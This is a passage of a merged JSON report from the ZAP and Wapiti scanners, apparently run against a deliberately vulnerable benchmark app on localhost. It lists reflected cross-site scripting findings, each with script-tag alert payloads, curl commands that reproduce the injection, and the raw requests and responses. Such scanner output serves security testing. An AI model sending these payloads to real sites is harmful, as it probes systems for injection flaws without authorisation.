                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02130?secure=default&productID=default&foo=foo&BenchmarkTest02130=%3CScRiPt%3Ealert%28%27wztbkr0k8i%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wztbkr0k8i')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wztbkr0k8i')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02130\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02130.html?BenchmarkTest02130=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest02130=%3CScRiPt%3Ealert%28%27wztbkr0k8i%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02130"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02130', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02130.html?BenchmarkTest02130=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAyMTMwPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02130', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02130.html?BenchmarkTest02130=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest02130=%3CScRiPt%3Ealert%28%27wztbkr0k8i%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '59', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:00 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Formatted like: a and <scrIpt>alert(1);</scRipt>_SafeStuff.'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '69', 'date': 'Sun, 31 Aug 2025 04:25:52 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Formatted like: a and <ScRiPt>alert('wztbkr0k8i')</sCrIpT>_SafeStuff.\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02132",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02132?BenchmarkTest02132=%3CScRiPt%3Ealert%28%27wc3vwmu25m%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wc3vwmu25m')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wc3vwmu25m')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02132\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02132.html\" -d \"BenchmarkTest02132=%3CScRiPt%3Ealert%28%27wc3vwmu25m%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02132"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02132', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '61', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02132.html?BenchmarkTest02132=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMTMyPSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02132', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02132.html', 'content-length': '73', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02132=%3CScRiPt%3Ealert%28%27wc3vwmu25m%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '27', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>\\n'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '37', 'date': 'Sun, 31 Aug 2025 04:25:53 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('wc3vwmu25m')</sCrIpT>\\n\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02136",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02136?BenchmarkTest02136=SafeText&BenchmarkTest02136=Movies&BenchmarkTest02136=Writing&BenchmarkTest02136=%3CScRiPt%3Ealert%28%27whr9q5x9rm%27%29%3C%2FsCrIpT%3E&foo=bar"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('whr9q5x9rm')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('whr9q5x9rm')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02136\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02136.html?BenchmarkTest02136=SafeText\" -d \"BenchmarkTest02136=SafeText&BenchmarkTest02136=Movies&BenchmarkTest02136=Writing&BenchmarkTest02136=%3CScRiPt%3Ealert%28%27whr9q5x9rm%27%29%3C%2FsCrIpT%3E&foo=bar\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02136"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02136', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '69', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02136.html?BenchmarkTest02136=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'QmVuY2htYXJrVGVzdDAyMTM2PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRSZmb289YmFy'}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02136', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02136.html?BenchmarkTest02136=SafeText', 'content-length': '81', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'BenchmarkTest02136=SafeText&BenchmarkTest02136=Movies&BenchmarkTest02136=Writing&BenchmarkTest02136=%3CScRiPt%3Ealert%28%27whr9q5x9rm%27%29%3C%2FsCrIpT%3E&foo=bar'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '26', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': '<scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '36', 'date': 'Sun, 31 Aug 2025 04:25:59 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"<ScRiPt>alert('whr9q5x9rm')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02145",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02145?secure=default&productID=default&foo=foo&BenchmarkTest02145=%3CScRiPt%3Ealert%28%27w3mls62o7j%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('w3mls62o7j')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('w3mls62o7j')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02145\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02145.html?BenchmarkTest02145=SafeText\" -d \"secure=default&productID=default&foo=foo&BenchmarkTest02145=%3CScRiPt%3Ealert%28%27w3mls62o7j%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02145"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
            "ZAP - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02145', 'method': 'POST', 'headers': {'cache-control': 'no-cache', 'content-length': '94', 'content-type': 'application/x-www-form-urlencoded', 'host': 'localhost:8444', 'pragma': 'no-cache', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02145.html?BenchmarkTest02145=SafeText', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', 'x-zap-scan-id': '40012'}, 'body': {'binary': 'c2VjdXJlPVpBUCZwcm9kdWN0SUQ9WkFQJmZvbz1mb28mQmVuY2htYXJrVGVzdDAyMTQ1PSUzQ3NjcklwdCUzRWFsZXJ0JTI4MSUyOSUzQiUzQyUyRnNjUmlwdCUzRQ=='}}",
            "Wapiti - {'protocol': 'HTTP', 'version': '1.1', 'target': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02145', 'method': 'POST', 'headers': {'host': 'localhost:8444', 'connection': 'keep-alive', 'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0', 'accept-language': 'en-US', 'accept-encoding': 'gzip, deflate, br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'referer': 'https://localhost:8444/benchmark/xss-04/BenchmarkTest02145.html?BenchmarkTest02145=SafeText', 'content-length': '114', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': {'text': 'secure=default&productID=default&foo=foo&BenchmarkTest02145=%3CScRiPt%3Ealert%28%27w3mls62o7j%27%29%3C%2FsCrIpT%3E'}}"
          ],
          "webResponse": [
            "ZAP - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Content-Length': '43', 'Content-Security-Policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'Content-Type': 'text/html;charset=UTF-8', 'Date': 'Wed, 03 Sep 2025 03:25:01 GMT', 'Strict-Transport-Security': 'max-age=31536000;includeSubDomains', 'X-Content-Type-Options': 'nosniff', 'X-Frame-Options': 'DENY', 'X-XSS-Protection': '0'}, 'body': {'text': 'Parameter value: <scrIpt>alert(1);</scRipt>'}, 'noResponseReceived': False}",
            "Wapiti - {'statusCode': 200, 'reasonPhrase': '', 'protocol': 'HTTP', 'version': '1.1', 'headers': {'content-security-policy': \"frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com\", 'cache-control': 'no-cache, no-store, must-revalidate', 'strict-transport-security': 'max-age=31536000;includeSubDomains', 'x-frame-options': 'DENY', 'x-content-type-options': 'nosniff', 'x-xss-protection': '0', 'content-type': 'text/html;charset=UTF-8', 'content-length': '53', 'date': 'Sun, 31 Aug 2025 04:25:59 GMT', 'keep-alive': 'timeout=20', 'connection': 'keep-alive'}, 'body': {'text': \"Parameter value: <ScRiPt>alert('w3mls62o7j')</sCrIpT>\"}}"
          ]
        },
        {
          "level": [
            "ZAP - error",
            "Wapiti - 2"
          ],
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": [
                    "ZAP - https://localhost:8444/benchmark/xss-04/BenchmarkTest02224",
                    "Wapiti - https://localhost:8444/benchmark/xss-04/BenchmarkTest02224?email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02224=%3CScRiPt%3Ealert%28%27wiozbqe8d3%27%29%3C%2FsCrIpT%3E"
                  ]
                },
                "region": {
                  "startLine": [
                    "ZAP - 1",
                    "Wapiti - 1"
                  ],
                  "snippet": {
                    "text": [
                      "ZAP - <scrIpt>alert(1);</scRipt>",
                      "Wapiti - <ScRiPt>alert('wiozbqe8d3')</sCrIpT>"
                    ]
                  }
                }
              },
              "properties": {
                "attack": [
                  "ZAP - <scrIpt>alert(1);</scRipt>",
                  "Wapiti - <ScRiPt>alert('wiozbqe8d3')</sCrIpT>"
                ],
                "curl_command": "Wapiti - curl \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02224\" -e \"https://localhost:8444/benchmark/xss-04/BenchmarkTest02224.html\" -d \"email=wapiti2021%40mailinator.com&password=Letm3in_&BenchmarkTest02224=%3CScRiPt%3Ealert%28%27wiozbqe8d3%27%29%3C%2FsCrIpT%3E\""
              }
            }
          ],
          "message": {
            "text": [
              "ZAP - Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.\nWhen an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.\n\nThere are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.\nNon-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.\nPersistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.",
              "Wapiti - Reflected Cross Site Scripting vulnerability found via injection in the parameter BenchmarkTest02224"
            ]
          },
          "ruleId": [
            "ZAP - 40012",
            "Wapiti - wapiti-reflected-cross-site-scripting"
          ],
          "webRequest": [
